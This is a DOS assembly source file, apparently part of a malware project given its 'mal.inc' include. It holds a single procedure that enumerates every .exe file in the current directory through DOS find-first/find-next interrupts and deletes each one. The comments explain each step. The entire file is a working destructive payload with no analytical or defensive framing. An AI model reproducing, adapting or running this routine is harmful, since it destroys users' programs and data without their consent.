INCLUDE mal.inc

.code
	search_exe_files_and_delete PROC, ptrDTA:PTR BYTE, ptrDEL:PTR BYTE
	
	;Requires generic pattern for exe files to be declared in files variable
	;Uses dx, ah, cx registers and delete_file function
	;Sets manual DTA defined in .data
	;Searches all of the exe files in the current directory and deletes them
	
		mov dx, ptrDTA
		mov ah, 1Ah     	;Setting Disk Transfer Address to 128 bytes
		int 21h				;DTA is used for 4Eh and 4Fh
	
		mov ah, 4Eh			;Find first file in this case *.exe file, * is wildcard 
		mov cx, 00h			;Attribute is 00h	
		mov dx, ptrDEL
		int 21h
		JC quit				;If carry is set either File is not found or No more files
		
		mov dx, ptrDTA+30	;File name is present at offset 30 of DTA,attribute,time stamps etc are present before offset 30
		INVOKE delete_file
		
		search_files:
			mov ah, 4Fh		;Find next file,DTA must point at a data record set up by Find first file interrupt
			mov cx, 00h		;Attribute is 00h read-only
			int 21h
			JC quit			;If carry is set then there aren't any more files ax will have 18	
			
			mov dx, ptrDTA+30	;Next file name is at 30 offset of DTA
			INVOKE delete_file		;.exe file is already present in dx
			JMP search_files		;Keep searching files
		
		quit:
		
		ret
		
	search_exe_files_and_delete ENDP

END